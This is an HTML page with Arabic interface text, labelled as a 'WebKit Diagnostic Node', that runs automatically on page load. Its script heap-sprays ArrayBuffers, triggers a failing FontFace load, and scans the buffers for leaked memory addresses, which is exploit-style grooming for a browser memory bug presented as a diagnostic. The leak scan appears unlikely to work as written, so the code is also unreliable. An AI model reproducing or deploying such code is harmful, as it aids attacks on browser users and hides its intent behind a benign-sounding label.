<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>WebKit Diagnostic Node</title>
    <style>
        body { font-family: monospace; background: #111; color: #00ff00; padding: 20px; }
        #status { font-weight: bold; color: #fff; }
        #log { margin-top: 20px; color: #aaa; }
    </style>
</head>
<body>
    <h1>WebKit Memory Area Analysis</h1>
    <p>المؤشر الحالي: <span id="status">بدء التشغيل...</span></p>
    <div id="log"></div>

    <script>
        var heapSpray = [];
        var TARGET_SIZE = 0x1000; // 4KB Base Page

        function printLog(msg) {
            var logDiv = document.getElementById('log');
            logDiv.innerHTML += "[*] " + msg + "<br>";
        }

        function updateStatus(statusText) {
            document.getElementById('status').innerText = statusText;
        }

        function startMemoryGrooming() {
            updateStatus("جاري تهيئة مخصص الذاكرة...");
            printLog("بدء حجز كتل الذاكرة المعزولة...");

            try {
                // مرحلة تهيئة كتل الذاكرة المخصصة لتحديد هندسة التوزيع
                for (var i = 0; i < 400; i++) {
                    var blockSize = TARGET_SIZE + (i % 2 === 0 ? 16 : 32);
                    heapSpray.push(new ArrayBuffer(blockSize));
                }
                printLog("تم تخصيص 400 كتلة ذاكرة بنجاح.");
                triggerLifecycleTest();
            } catch (e) {
                updateStatus("فشل أثناء حجز الذاكرة");
                printLog("خطأ: " + e.message);
            }
        }

        function triggerLifecycleTest() {
            updateStatus("جاري فحص دورة حياة كائن الخط...");
            printLog("استدعاء واجهة FontFace لإنشاء حالة تعليق...");

            try {
                // ترويسة خط غير صالحة عمداً لتحفيز معالجة الخطأ برمجياً
                var font = new FontFace('TestFont', 'url(data:font/opentype;base64,AAAA)');
                
                font.load().then(function() {
                    updateStatus("اكتمل التحميل بشكل غير متوقع");
                }).catch(function(err) {
                    updateStatus("حالة الخطأ نشطة (متوقع)");
                    printLog("تم رصد إشارة الفشل. بدء فحص العناوين الملوثة...");
                    // الانتقال المباشر لفحص محتويات الذاكرة المحجوزة
                    executeScan();
                });
            } catch (e) {
                updateStatus("فشل استدعاء الواجهة");
                printLog("خطأ في البنية: " + e.message);
            }
        }

        function executeScan() {
            updateStatus("جاري مسح فضاء العناوين...");
            var foundLeak = false;

            for (var i = 0; i < heapSpray.length; i++) {
                if (heapSpray[i].byteLength < 8) continue;
                var view = new DataView(heapSpray[i]);
                
                try {
                    // محاولة قراءة المؤشرات الأولى في الكتلة الذاكرية
                    var potentialAddress = view.getBigUint64(0, true);
                    
                    // التحقق من النطاق المعياري لعناوين فضاء المستخدم للمكتبات المشتركة
                    if (potentialAddress > 0x100000000n && potentialAddress < 0x800000000n) {
                        updateStatus("تم رصد إزاحة عنوان نشطة!");
                        printLog("مؤشر ملوث في الكتلة رقم [" + i + "]: 0x" + potentialAddress.toString(16));
                        foundLeak = true;
                        break;
                    }
                } catch (e) {
                    // تجاوز أخطاء القراءة الحدودية
                }
            }

            if (!foundLeak) {
                updateStatus("اكتمل المسح دون رصد تداخل");
                printLog("النتيجة: لم يتم العثور على مؤشرات حرة. قد يتطلب الأمر ضبط أحجام الكتل.");
            }
        }

        // بدء التشغيل التلقائي بعد استقرار تراكيب الصفحة
        window.onload = function() {
            setTimeout(startMemoryGrooming, 500);
        };
    </script>
</body>
</html>
